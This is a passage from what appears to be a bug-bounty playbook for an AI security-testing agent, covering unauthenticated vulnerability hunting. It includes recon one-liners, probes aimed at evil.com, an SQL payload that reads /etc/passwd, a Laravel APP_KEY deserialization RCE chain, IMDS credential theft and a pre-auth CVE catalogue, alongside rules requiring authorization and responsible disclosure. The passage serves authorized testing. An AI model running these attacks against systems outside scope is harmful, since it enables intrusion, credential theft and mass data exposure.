| Laravel `.env`+`APP_KEY` / SharePoint / Ivanti / Citrix / Fortinet banner | **3.4 Pre-auth CVE** (TIER-0, see `references/preauth-cves.md`) |
| Behind a CDN/proxy; `Expect:`/`Transfer-Encoding` handled oddly; timing delta on smuggle probe | **3.15 HTTP Desync + Cache** |
| `Cf-Cache-Status: HIT` on a dynamic/authed path; reflected `X-Forwarded-Host` | **3.15 HTTP Desync + Cache** (web cache deception/poisoning) |
| AI/ML host (Langflow/Flowise/ComfyUI/Ray/MLflow/Ollama :7860/:8188/:8265/:5000/:11434) | **3.3 Exposed Services** (AI/ML section) |

---

## THE UNAUTH P1 BUG CLASSES (canonical taxonomy)

Every finding should map to one of these. CVSS scores are the typical ceiling when impact is fully demonstrated. Manual hunting techniques first — automation (nuclei/sqlmap) is a confirmation aid, never the discovery method.

| # | Bug class | CVSS ceiling | Manual signal to hunt |
|---|---|---|---|
| 1 | **Pre-auth RCE** | 10.0 | Banner/version match for vulnerable product; old endpoints in wayback; debug routes; dev/stage hosts |
| 2 | **SQLi — auth bypass / dump** | 9.8 | Error strings, time-skew on `'`/`"`/`;`, ORDER BY differential, header & cookie reflection in queries |
| 3 | **Unauth SSRF (full internal access)** | 9.8 | Any `url=`/`image=`/`fetch=`/`webhook=`/`callback=` param on unauth path, PDF/image renderer, link preview |
| 4 | **IDOR — mass data exposure** | 9.1 | `/api/.../{id}` sequential IDs, public exports, GUID predictability, `/profile/{slug}`, `/invoice/{n}` |
| 5 | **Auth bypass via JWT / token flaws** | 9.8 | `alg:none`, `kid` traversal/SQLi, weak HS256 secret, public-key confusion, no signature verification |
| 6 | **XXE** | 9.1 | XML POST endpoints, SOAP, SAML, SVG/DOCX/XLSX upload, OOXML, RSS importer |
| 7 | **Path traversal → arbitrary file R/W** | 9.3 | `?file=`, `?path=`, `?download=`, `?template=`, double-encoded `..%2f`, archive extraction |
| 8 | **BOLA on GraphQL/REST (no-auth API)** | 9.1 | Endpoint reachable without cookie/JWT; `node(id:"...")`; verb-tunneling; `/internal/`; mobile API origin; status/state path siblings (`/invitations/unchallenged` vs `/challenged`, `pending`/`accepted`) where authz is wired per-variant → 200 vs 4xx leaks tokens+PII cross-org |
| 9 | **Unauth RFI / LFI** | 8.8 | `?page=`, `?include=`, `?module=`, PHP wrappers (`php://filter`, `data://`), log poisoning |
| 10 | **Exposed admin panels / default creds** | 8.8 | Title/favicon match, `/admin`, `/manager`, `/jenkins`, `/grafana`, `/console`, vendor default creds |
| 11 | **HTTP desync / request smuggling** | 9.8 | Front-end/back-end parser gap; Expect/0.CL/CL.0/H2.0; timing delta on `/con`/`.css` paths → response-queue poisoning → mass ATO |
| 12 | **Web cache deception / poisoning** | 9.1 | `Cf-Cache-Status: HIT` on a nonexistent path under a cacheable prefix; unkeyed `X-Forwarded-Host`; `/share/%2F..%2Fapi/...` parser confusion → cached per-user token |
| 13 | **Unauth RCE on AI/ML infra** | 9.8 | Langflow/Flowise/ComfyUI/Ray/MLflow/Ollama/Jupyter exposed with no auth → code/flow/job exec |

→ Detailed manual playbooks: classes 1–10 in `references/top10-unauth.md`; classes 11–12 in `references/desync-and-cache.md`; class 13 in `references/exposed-services.md` (AI/ML section).

---

## PHASE 3 — UNAUTH P1 KILLCHAINS

### 3.1 — Subdomain Takeover
**Why P1**: Cookie scope, OAuth `redirect_uri`, CORS allowlist, SSO origin, brand abuse.

Read `references/subdomain-takeover.md`. Quick check:
```bash
nuclei -l subs.uniq -t http/takeovers/ -severity high,critical
subzy run --targets subs.uniq --concurrency 50 --hide_fails
# manual: dig CNAME, fetch URL, look for provider-specific 404 fingerprints
```
**Escalation**: claim the dangling resource → host JS / cookies → ATO via cookie injection on sibling subdomain → tenant-wide impact.

### 3.2 — Source Code / Config Exposure
**Why P1**: Full source → secrets → DB creds → RCE chain.
```bash
nuclei -l alive.txt -t http/exposures/ -severity high,critical
# Targeted .git
for u in $(cat alive.txt); do curl -s -o /dev/null -w "%{http_code} $u/.git/HEAD\n" $u/.git/HEAD; done | grep '^200'
# Then full dump
git-dumper http://x.target.com/.git/ ./dumped
# .env / web.config / actuator / Swagger / phpinfo / server-status / .well-known
ffuf -w wordlists/sensitive.txt -u https://FUZZ.$T/FUZZ2 -mc 200,403 -ac
```
**Escalation**: clone repo → trufflehog the history → find DB / cloud creds → pivot.

### 3.3 — Exposed Services (the gold mine)
Read `references/exposed-services.md`. Per-service unauth checks:

```
Jenkins         → /script (Groovy console), /jnlpJars/jenkins-cli.jar, /env-vars.html, /asynchPeople/
                  Pre-auth RCE: CVE-2024-23897 (file read → secret → RCE chain)
Spring Boot     → /actuator/env, /actuator/heapdump (! creds in memory), /actuator/jolokia
Kubernetes API  → /api/v1/namespaces (anonymous), /version, /apis
Etcd            → :2379/v2/keys (cluster secrets)
Consul          → :8500/v1/kv/?recurse
Elasticsearch   → /_cat/indices?v, /_search?q=password
MongoDB         → mongo --host x.target.com (no auth?)
Redis           → redis-cli -h x.target.com (no auth?), then SLAVEOF / CONFIG SET dir for RCE
Memcached       → stats, get *
Grafana         → /api/datasources (auth=anon), CVE-2021-43798 path traversal
Kibana          → /api/console/proxy, /app/kibana#/dev_tools
Airflow         → /admin/airflow/dag_code (DAG source), pre-auth RCE CVE-2022-40127
Argo Workflows  → /api/v1/workflows (anon)
Zeppelin        → /#/notebook (no auth) — RCE via Shell interpreter
Drupal          → /core/COMPOSER.json (version), Drupalgeddon variants
GitLab          → /-/users/sign_in (version banner), CVE-2023-7028 (no-click ATO via secondary email)
Confluence      → /login.action?logout=true (version footer), CVE-2022-26134 (OGNL), CVE-2023-22515 (admin creation), CVE-2023-22518 (config wipe)
Atlassian Jira  → /servicedesk/customer/user/login (Jira SD), CVE-2022-0540 / CVE-2023-22501
Citrix ADC      → /vpn/index.html (Citrix Bleed CVE-2023-4966 session hijack)
Fortinet        → /remote/login (FortiOS), CVE-2024-21762, CVE-2022-42475
F5 BIG-IP       → /tmui/login.jsp, CVE-2023-46747, CVE-2022-1388
MOVEit          → /human.aspx → CVE-2023-34362
PaperCut        → CVE-2023-27350 pre-auth RCE
Telerik         → /Telerik.Web.UI.WebResource.axd?type=rau — CVE-2019-18935
Apache Struts   → /struts2-showcase/ → CVE-2017-5638
GhostScript     → upload-based, parser confusion
Apache OFBiz    → CVE-2023-49070 / CVE-2023-51467 (auth bypass + XML-RPC RCE)
ActiveMQ        → :61616 OpenWire → CVE-2023-46604 (unauth deserialization RCE)
TeamCity        → /login.html → CVE-2024-27198/27199 (auth bypass → admin → RCE)
--- 2025 TIER-0 (mass-exploited pre-auth RCE — see preauth-cves.md) ---
SharePoint      → /_layouts/15/ToolPane.aspx (ToolShell CVE-2025-53770/53771) — IoC spinstall0.aspx
Ivanti CS       → /dana-na/... CVE-2025-0282 / 2025-22457 ; EPMM CVE-2025-4427+4428 (chain)
Citrix NS       → /vpn/index.html CVE-2025-6543 / 2025-7775 ; CitrixBleed2 CVE-2025-5777 (token leak)
Fortinet        → FortiSIEM CVE-2025-25256 ; FortiOS CVE-2024-55591 (auth bypass)
Palo Alto GP    → /global-protect/login.esp CVE-2024-3400 ; mgmt CVE-2024-0012+9474
PHP-CGI (Win)   → CVE-2024-4577 (arg injection → unauth RCE, XAMPP/Windows)
Erlang/OTP SSH  → CVE-2025-32433 (pre-auth RCE) ; Next.js CVE-2025-29927 (middleware authz bypass)
Magento         → CVE-2024-34102 CosmicSting (XXE→RCE) ; WordPress plugins (Bricks CVE-2024-25600)
Laravel (.env)  → leaked APP_KEY → decrypt()/unserialize() RCE (see secrets-recon.md)
```

### 3.4 — Pre-auth CVE Catalog
Read `references/preauth-cves.md` for the comprehensive list. Workflow:
```bash
# Mass fingerprint then map to nuclei templates
nuclei -l alive.txt -severity critical,high -t cves/ -t exposed-panels/ -t default-logins/ -rl 100
# For each hit, MANUALLY confirm version + try public PoC against your own clone first, never blind on prod
```

### 3.5 — Cloud Storage Exposure
Read `references/cloud-storage.md`.
```bash
# Bucket name candidates
for kw in $T $ORG ${T%.*} prod stage dev backup assets media; do echo $kw; done > bn.txt

# S3
for b in $(cat bn.txt); do
  aws s3 ls s3://$b --no-sign-request 2>/dev/null && echo "PUB: $b"
done
# GCS / Azure variants
gsutil ls -p $b gs://$b 2>/dev/null
curl -s "https://$b.blob.core.windows.net/?comp=list"

# Public-write check (only if explicitly in scope and you can PoC with a marker file)
aws s3 cp poc.txt s3://$b/poc-$(date +%s).txt --no-sign-request
```
**Escalation**: writeable JS bundle → supply-chain XSS on every customer page → ATO at scale.

### 3.6 — Unauth SSRF / Open Redirect
Sources from JS / wayback: `url=`, `image=`, `callback=`, `next=`, `redirect=`, `return_to=`, `dest=`, `link=`, `target=`.
```bash
# SSRF probe with collaborator
qsreplace 'http://OOB.collab/SSRF' < urls.params > probe.urls
httpx -l probe.urls -silent
# Open redirect mass test
echo "$T" | gau | gf redirect | qsreplace 'https://evil.com' | httpx -fr -mc 301,302 -location
```
**Escalation**: SSRF → 169.254.169.254 / metadata.google.internal → IMDS creds → S3/source → pivot to higher P1.
**Open redirect → OAuth `redirect_uri` ATO** when the OAuth client allows wildcard / suffix match.

### 3.7 — CORS w/ Credentials
```bash
# Look for ACAO reflection + ACAC:true
for u in $(cat alive.txt); do
  r=$(curl -s -H "Origin: https://evil.com" -I $u)
  echo "$r" | grep -i 'access-control-allow-origin: https://evil.com' >/dev/null && \
    echo "$r" | grep -i 'access-control-allow-credentials: true' >/dev/null && \
    echo "VULN: $u"
done
```
**Escalation**: read authenticated user data via XHR from attacker page → ATO.

### 3.8 — GraphQL Unauth
```bash
for u in $(cat alive.txt); do
  for p in /graphql /api/graphql /v1/graphql /graphiql; do
    r=$(curl -s -X POST $u$p -H 'Content-Type: application/json' \
      -d '{"query":"{__schema{types{name}}}"}')
    echo "$r" | grep -q '__schema' && echo "INTRO ON: $u$p"
  done
done
```
**Escalation**: introspect → find admin/internal queries → BOLA/IDOR → cross-tenant data.

### 3.9 — Live Secret Hunt
Already done in Phase 1, but escalate verified hits:
- AWS key → `aws sts get-caller-identity` → enumerate via `pacu` / `enumerate-iam`
- GitHub PAT → `curl -H "Authorization: token X" https://api.github.com/user`
- Slack token → check `auth.test`, `team.info`, `users.list`
- Stripe / Sendgrid / Twilio → check key type (test vs live) before reporting
**Never** use creds beyond `whoami`-style identity confirmation unless explicit scope says so.

### 3.10 — Dependency Confusion
Read `references/dependency-confusion.md`.
```bash
# Find internal-looking package names in client JS / package.json leaks
grep -rEoh '"@[a-z0-9-]+/[a-z0-9-]+"' js/ | sort -u > pkgs.scoped
grep -rEoh '"[a-z][a-z0-9-]+":\s*"[\^~]?[0-9]' js/ | awk -F'"' '{print $2}' | sort -u > pkgs.flat
# Check which are NOT on npm (the takeable ones)
for p in $(cat pkgs.scoped pkgs.flat); do
  npm view $p name 2>/dev/null || echo "UNCLAIMED: $p"
done
```
**Escalation only with explicit scope**: publish marker package to a private namespace you control; observe DNS callback from build agent. Never ship malicious code.

### 3.11 — WAF / Origin IP Bypass
```bash
# Cert SAN history (origin often in old certs)
curl -s "https://crt.sh/?q=%25.$T&output=json" | jq -r '.[].name_value' | sort -u
# Favicon hash → Shodan
fav=$(curl -s https://$T/favicon.ico | md5sum)
shodan search "http.favicon.hash:$fav"
# Email headers (Received: from real IP)
# DNS history (SecurityTrails, ViewDNS)
```
**Escalation**: bypass CDN → hit origin directly → bypass WAF rules → re-enable disabled endpoints.

### 3.12 — Anonymous Info-Disclosure & Unauth-API Chains (field-tested 2026)

Each is one unauth curl and triagers fast-track them — but read the **dedup warning** at the end before you invest in a report.

**Anonymous Prometheus / metrics** — `/-/metrics`, `/metrics`, `/actuator/prometheus`:
```bash
curl -s "https://$H/-/metrics" | wc -c                                   # ~1MB+ = full internal telemetry
curl -s "https://$H/-/metrics" | grep -E '192\.168\.|10\.|host=|db_config|replica|_pool_'
```
Leaks K8s pod IPs, DB primary/replica topology, Redis shards, and 100+ internal admin route names — a network map for SSRF pivoting. (Real: a live GitLab `/-/metrics` returned 6.3 MB exposing pod IPs + DB topology.)

**Identity / existence oracle** — a differential response confirms valid users/accounts unauth, no rate limit:
```bash
curl -s "https://$H/api/v4/users?username=admin"    # returns an id  -> real
curl -s "https://$H/api/v4/users?username=zzz_nope"  # returns []     -> absent
```
Also fires on password-salt/hash endpoints: a *real* account returns a distinguishable shape (e.g. mixed-case salt) vs a lowercase decoy for a fake one. Builds an unauth target list for phishing / credential stuffing.

**OAuth `password` grant enabled** — read the discovery doc:
```bash
curl -s "https://$H/.well-known/openid-configuration" | jq '.grant_types_supported'
```
If `"password"` is present, the token endpoint accepts direct username/password → credential stuffing that bypasses the login page's rate-limit and MFA prompt.

**Missing auth on an internal microservice** — subdomains like `embeddings.`, `*-api.`, `internal-*`. Probe the contract first; an open spec usually means the service itself is open:
```bash
curl -s "https://$H/openapi.json"                                        # full API spec, no token
curl -s "https://$H/meta"; curl -s -X POST "https://$H/vectors" -d '{"text":"x"}'
```
→ free compute abuse + DoS (no input cap) + full contract disclosure. (Real: `embeddings.nd-api.com` served spec + `/vectors` unauth.)

**Unauth / any-user raw-SQL or tenant-scoped query endpoint** — a `POST .../sql/query` or report API running arbitrary SQL. Confirm privilege + isolation before claiming impact:
```bash
curl -s -X POST "https://$H/web/query/sys/sql/query" -H 'token: <t>' \
  --data-binary '{"sql":"SELECT current_user,(SELECT rolsuper FROM pg_roles WHERE rolname=current_user)"}'
curl ... --data-binary '{"sql":"SELECT count(*) FROM sys_tenant"}'        # >1 tenant visible = cross-tenant
curl ... --data-binary $'{"sql":"SELECT pg_read_file(\'/etc/passwd\',0,999)"}'  # superuser file read -> RCE ceiling
```
Superuser role + ignored tenant header = read/modify all tenants + OS file read → RCE/lateral. (Real: `farmer` PG superuser, 2,984 tenants readable via one endpoint.)

**Dependency confusion via an exposed internal registry** — a public registry mirror (`rust-registry.$T`, npm proxy) that lists **internal package names**. Cross-check claimability on the public registry (`crates.io`/`npmjs`); an unclaimed name is a supply-chain RCE seed → route to `dependency-confusion`.

> **Dedup warning:** anonymous metrics, GraphQL introspection, and existence oracles are **high-duplication** surfaces — everyone checks them. On several 2026 programs these came back **duplicate / no reward** even when valid. Submit only when you (a) chain to concrete internal-service access / SSRF / cross-tenant PII, or (b) can confirm it isn't already known. Lead the report with the *chain*, not the disclosure. See `triage-validation`.

---

### 3.13 — MASS-PII KILLCHAIN (millions of records, zero auth)

> The single highest-value unauth outcome after RCE. Read `references/cloud-storage.md`. Run these five probes on **every** target; each is one unauth request and each has produced 7-figure record leaks in 2024–2025.

The five mass-PII wells, in yield order:

1. **Firebase** (biggest 2024–25 source — 19M plaintext pw, Tea App 1.1M DMs). Grep JS for `firebaseio.com` / `AIza…` / `projectId`, then:
   ```bash
   PID=<project>
   curl -s "https://$PID.firebaseio.com/.json?shallow=true"                                  # RTDB open?
   curl -s "https://firestore.googleapis.com/v1/projects/$PID/databases/(default)/documents"  # Firestore open?
   curl -s "https://firebasestorage.googleapis.com/v0/b/$PID.appspot.com/o?maxResults=50"     # Storage open?
   # If "auth != null" rules: anon-signup a token first (cloud-storage.md §5e) then re-read.
   ```
2. **Exposed buckets** (S3/GCS/Azure) — `s3scanner`, `cloud_enum`, GrayhatWarfare. Read = mass PII; write = supply-chain XSS.
3. **Open databases** — ES `:9200/_cat/indices?v`, Mongo `:27017`, Redis `:6379`, CouchDB `:5984/_all_dbs`. No-auth-by-default = full dump.
4. **Unauth API BOLA** (2025's #1 API bug) — `/api/.../{id}` reachable with no cookie, GraphQL `node(id:)`, mobile-API host, old `/v1/` after `/v2/` added auth, status/state path siblings. Two adjacent IDs → different users = leak.
5. **Public exports / old endpoints** — wayback `gau $T | grep -Ei 'export|report|invoice|dump|\.csv|\.xlsx|users'` → fetch archived + live.

**Quantify from metadata, never exfiltrate:** `_cat/indices` `docs.count`, S3 `<KeyCount>`, RTDB `?shallow=true` key count. **One redacted record + a count = complete PoC.** Report lead: *"Unauth `<surface>` exposes `<N>` records incl. `<PII types>`."*

### 3.14 — CLOUD-TAKEOVER KILLCHAIN (org-level compromise)

> From leaked key / SSRF / dangling resource → control of the cloud account or a branded asset. Read `references/secrets-recon.md` + `references/cloud-storage.md` + `references/subdomain-takeover.md`. Verify with **identity-only** calls; prove capability, never detonate.

Four independent entry paths, all converging on takeover:

1. **Leaked key → IAM privesc** (2024–25 mass extortion class). `.env` 200 or `AKIA…`/`AIza…`/SA-JSON in JS/GitHub →
   ```bash
   aws sts get-caller-identity                              # WHO = your proof
   enumerate-iam --access-key … --secret-key …             # what it CAN do (read-only)
   ```
   Reachable `iam:CreatePolicyVersion` / `PassRole`+`lambda:CreateFunction` / `iam:CreateAccessKey` = **account takeover**. Report the *capability*, don't create the admin.
2. **`.env` → Laravel APP_KEY → unauth RCE** — `decrypt()` auto-`unserialize()`s: `phpggc Laravel/RCE9 system id -b` → `laravel_crypto_killer encrypt -k $APP_KEY` → send in `X-XSRF-TOKEN`. Plus the cloud/DB creds inside the same `.env` = double P1.
3. **SSRF → IMDS → cloud creds** — if SSRF controls method/headers, IMDSv2 falls (`PUT /latest/api/token` then `GET …/iam/security-credentials/`). GCP `metadata.google.internal` (+`Metadata-Flavor: Google`), Azure managed-identity, and newer MMDS endpoints (Bedrock AgentCore) that skip token enforcement.
4. **Dangling resource takeover** — dead-bucket CNAME (`The specified bucket does not exist`), Azure resource reclaim in another subscription, subdomain takeover on an OAuth-`redirect_uri`/cookie-scoped/CSP-allowed host → content control → **ATO / tenant-wide**.

Also: **GitHub write-PAT** → CI secret exfil / **dependency-confusion** push → supply-chain RCE. **Report lead:** *"This `<key/SSRF/resource>` grants `<create IAM users / RCE on build CI / content control on OAuth origin>` → org-level compromise,"* backed by an identity/capability proof — not exfiltrated data.

### 3.15 — HTTP DESYNC + WEB CACHE (every-user, zero-interaction)

> The highest-paying unauth *web* class of 2025 ($350K+ in two weeks). Every site behind a CDN/proxy is a candidate. Read `references/desync-and-cache.md`. **Danger: these poison responses for real users — test only in scope, with self-triggered non-destructive probes, never a payload a third party could receive.**

1. **HTTP desync / request smuggling** — front-end and back-end disagree on request boundaries → your bytes prepend to the next visitor's request → **response-queue poisoning** (you receive other users' authenticated responses → mass ATO). 2025 variants: **Expect-based** (vanilla + obfuscated `Expect: y 100-continue`), **0.CL** (needs early-response gadget like `/con`), **CL.0** (on `.css`/`.js` paths), **H2.0** downgrade. Detect with Burp **HTTP Request Smuggler v3** + a **timing delta** on your own connection. CVE-2025-32094 (Akamai), CVE-2025-4366.
2. **Web cache deception** — cache stores a per-user authed response under an attacker-fetchable URL. Find `Cf-Cache-Status: HIT` on a nonexistent path under a cacheable prefix, then route a cacheable-looking URL to a sensitive endpoint: `/share/%2F..%2Fapi/auth/session?cb=1` (ChatGPT-ATO class), `.css`/`;`/`%0a` suffix tricks → cached auth token → ATO.
3. **Web cache poisoning** — reflected **unkeyed** header (`X-Forwarded-Host`, `X-Forwarded-Scheme`) → cache a malicious redirect/XSS served to **all** visitors (Param Miner finds the unkeyed input).

**PoC discipline:** prove with a self-triggered discrepancy/timing delta or a two-session cache demo; flush the cache politely after; one redacted cross-user response is enough.

---

## PHASE 4 — IMPACT MAXIMIZATION

For each finding, run the **unauth multiplier checklist**:

```
Q1. Confirmed PRE-AUTH (no cookie, no header, no referrer trick)?      → +1 tier
Q2. Affects ALL customers / cross-tenant?                              → +2 tiers
Q3. Reveals credentials, source, or PII?                               → +1 tier
Q4. Persistent (stored / dangling / DNS-level)?                        → +1 tier
Q5. Chains to RCE / SQLi / ATO?                                        → +2 tiers
Q6. Mass-exploitable via automation?                                   → +1 tier
Q7. Zero user interaction?                                             → +1 tier
```

Three+ "yes" answers = TIER S report ($20K+ if in a paying program).

---

## PHASE 5 — REPORT

Read `references/report-writing.md`. Required sections:
1. **Title** — `[Pre-auth] {Class} on {host} → {impact}`
2. **Summary** — one paragraph, no jargon, lead with impact
3. **Steps to reproduce** — copyable curl/HTTP, exact URLs, no Burp screenshots only
4. **PoC** — minimal, deterministic, marker-file based
5. **Impact** — concrete data exposed (counts, types, examples — redacted)
6. **CVSS 3.1 vector** — be honest, AV:N/AC:L/PR:N/UI:N for true unauth
7. **Suggested fix** — vendor patch ref, config change, IAM tightening
8. **Disclosure timeline** — when you found, when you contacted, when you'll publish

---

## ROUTING — when to delegate

| Trigger | Delegate to |
|---|---|
| Heavy JS bundle / source maps / SPA analysis | `js-recon-agent` |
| SQLi signals (errors, time-based, ORDER BY) | `sqli-hunter-agent` |
| Reflected/DOM/stored XSS sinks | `xss-hunter-agent` |
| Business logic / workflow / payment / coupon | `blf-hunter-agent` |
| LLM/AI feature on the target | `prompt-injection-hunter-agent` |
| Full chain spanning many bug classes | `omni-killchain` |

For pure-unauth recon → exposure → CVE → secret → PoC, stay here.

---

## REFERENCE INDEX

- `references/top10-unauth.md` — **the manual playbook** for the 10 canonical unauth P1 classes (read this first)
- `references/recon-passive.md` — full passive recon one-liners and tool catalog
- `references/recon-active.md` — fingerprinting, port scan, JS harvest, manual exposure sweep (nuclei used only for confirmation)
- `references/subdomain-takeover.md` — dangling CNAME provider fingerprint catalog
- `references/exposed-services.md` — per-service unauth check + escalation (incl. AI/ML infra unauth RCE — Langflow/Ollama/ComfyUI/Ray/MLflow)
- `references/desync-and-cache.md` — HTTP request smuggling/desync (0.CL/CL.0/Expect/H2.0) + web cache deception + web cache poisoning (2025 methodology)
- `references/preauth-cves.md` — pre-auth RCE/auth-bypass CVE catalog by product, refreshed 2025/2026 (ToolShell, Ivanti, Citrix, Fortinet, PHP-CGI, Laravel, etc.)
- `references/cloud-storage.md` — **mass-PII + cloud-takeover**: S3/GCS/Azure/DO buckets, Firebase (RTDB/Firestore/Storage/Auth), open ES/Mongo/Redis/CouchDB, bucket takeover
- `references/secrets-recon.md` — GitHub/GitLab/Postman/Docker/npm secret hunting → leaked-key→IAM takeover + Laravel APP_KEY→RCE
- `references/dependency-confusion.md` — finding unclaimed internal packages
- `references/waf-origin-bypass.md` — origin IP discovery + CDN bypass
- `references/report-writing.md` — P1 report template + disclosure norms
- `references/wordlists.md` — curated wordlists for sensitive paths, panels, params

---

## TOOL CHECKLIST (install once)

```
# recon / probe
subfinder amass chaos cero httpx dnsx naabu nmap nuclei katana gospider gowitness
gau waybackurls qsreplace gf ffuf feroxbuster dirsearch arjun paramspider wafw00f
# secrets / source
trufflehog gitleaks noseyparker github-subdomains git-dumper linkfinder jsluice retire
# cloud storage + mass-PII
s3scanner cloud_enum gcpbucketbrute lazys3          # buckets (GrayhatWarfare for passive index)
OpenFirebase firebaseExploiter firebaseenum         # firebase RTDB/Firestore/Storage/Auth
redis-cli mongosh                                    # open-DB probing (ES/CouchDB via curl)
# takeover
subzy subjack dnsReaper                              # subdomain takeover
cloudfail cloudflair CloakQuest3r hakoriginfinder    # origin-IP / WAF bypass
# cloud post-key + exploit
aws-cli gsutil az pacu enumerate-iam ScoutSuite cloudsplaining
phpggc laravel_crypto_killer jwt_tool               # .env→RCE, JWT
confused snync                                       # dependency confusion
# HTTP desync / cache (Burp exts + standalone)
HTTP-Request-Smuggler-v3 Param-Miner Turbo-Intruder smuggler.py h2csmuggler echteeteepee
# osint datastores
shodan censys-cli   # (+ FOFA / ZoomEye / Netlas / SecurityTrails / urlscan / crt.sh)
```

## OPERATIONAL RULES (non-negotiable)

1. **Authorization first.** No active probing without confirmed scope.
2. **Rate-limit yourself.** Default ≤50 req/s, drop to 5 on first 429.
3. **No exfil beyond proof.** One record, one file, one config key.
4. **No prod disruption.** Never DoS, never delete, never write outside marker paths.
5. **Disclose responsibly.** Use the program's reporting channel; respect embargo.
6. **Never share credentials you found.** Even with the program — they handle it via the report.

## Unauth execution discipline (non-negotiable)

**Work in structured batches — not a flood, not ad-hoc.**
Process the target in this order, completing each batch fully before moving to the next:

**Batch 1 — Subdomain + live host inventory**
Enumerate all subdomains (subfinder/amass/crt.sh/chaos/github-subdomains). Run httpx across all.
Produce a ranked list: interesting subdomains first (admin, api, internal, staging, dev, auth, pay,
upload, cdn, app, dashboard). Do not begin Batch 2 until every subdomain is fingerprinted.

**Batch 2 — Per-subdomain JS + historical URL harvest (every valid subdomain, no exceptions)**
For EACH live subdomain in ranked order:
- Run the full crawl stack (waybackurls + gau + waymore + katana + hakrawler + gospider + cariddi)
- Extract ALL JS files: live crawl + wayback + source maps + service workers + inline scripts + framework chunks
- Read every JS file end-to-end — grep/scanners triage only, reading finds logic bugs
- Pull interesting wayback URLs: `.env`, `.git`, `.bak`, config files, old API versions, archived 404s
- Extract endpoints, params, secrets, auth logic, hidden routes from each JS file
- Mark subdomain as `js_read: done` in batch log only after ALL its JS files are read

Do not skip a subdomain because it "looks boring." Do not jump to Batch 3 mid-subdomain.

**Batch 3 — Killchain execution (findings-driven)**
Armed with the full JS + URL + endpoint map from Batch 2, work through every killchain the
target's own code points to. One killchain at a time, fully executed with bypass attempts.

**Context discipline on transition to authenticated testing:**
Before handing off to johnwick1 / authenticated phase:
- Every subdomain batch must be marked complete
- All JS files read and findings noted
- Coverage ledger updated with unauth findings and clean surfaces
- Write a clean handoff summary: live hosts, interesting endpoints found, secrets found,
  what was clean, what needs authenticated testing
- No half-finished unauth work. Authenticated phase starts with a clean slate.
